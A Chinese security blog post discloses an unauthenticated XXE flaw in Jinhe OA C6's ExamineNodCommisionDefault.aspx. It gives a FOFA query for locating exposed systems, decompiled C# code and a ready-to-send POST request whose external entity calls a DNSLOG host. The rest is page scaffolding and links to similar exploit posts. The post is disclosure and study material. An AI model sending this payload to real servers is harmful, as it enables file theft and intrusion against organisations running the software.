---
title: "金和OA ExamineNodCommisionDefault.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ExamineNodCommisionDefault-xxe.html
asset_dir: assets/金和oa-examinenodcommisiondefault.aspx-xxe漏洞
---

# 金和OA ExamineNodCommisionDefault.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/26 13:31
* 199浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

云安全解决方案

安全

JSON处理工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ExamineNodCommisionDefault.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

授权

安全运维咨询

安全研究报告

直接根据 `ExamineNodCommisionDefault.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ExamineNod.dll` 将其进行反编译后找到 **ExamineNodCommisionDefault** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  if (this.Request["Flag"] != null)
    this.strFlag = this.Request["Flag"].ToString().Trim();
  this.InitText();
  if (string.op_Inequality(this.strFlag, ""))
  {
    StreamReader streamReader = new StreamReader(this.Request.InputStream);
    bool flag = false;
    string end = ((TextReader) streamReader).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
    string innerText = xmlDocument.DocumentElement.ChildNodes[0].InnerText;
    if (this.strFlag.CompareTo("0") == 0)
```

深入探索

Docker加速服务

网页浏览器

SQL注入检测工具

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.examinenod/ExamineNodCommisionDefault.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

[![金和OA ExamineNodCommisionDefault.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA ExamineNodCommisionDefault.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ExamineNodCommisionDefault-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ExamineNodCommisionDefault-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ExamineNodCommisionDefault-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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